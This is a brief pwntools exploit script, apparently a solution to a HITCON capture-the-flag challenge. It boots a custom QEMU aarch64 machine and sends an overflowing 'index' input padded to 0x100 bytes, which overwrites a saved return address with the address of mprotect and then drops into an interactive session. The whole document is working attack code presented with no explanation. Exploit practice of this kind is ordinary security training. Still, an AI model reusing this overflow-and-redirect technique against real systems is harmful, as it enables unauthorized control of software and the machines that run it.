from pwn import *
context(arch='aarch64',endian='little')
  
cmd  = "cd ../../../run ;"
cmd += "./qemu-system-aarch64 -nographic -machine hitcon -cpu hitcon "
cmd += "-bios ./bios.bin -monitor /dev/null 2>/dev/null -serial null "

io = process(["/bin/sh","-c",cmd])

mprotect = 0x401B68

io.sendlineafter(b"cmd> ",b"1")
io.sendlineafter(b"index: ",b'4096 '.ljust(0x100,b'a')+p64(0)+p64(mprotect))
io.sendlineafter(b"key: ",b'1234567')
io.interactive()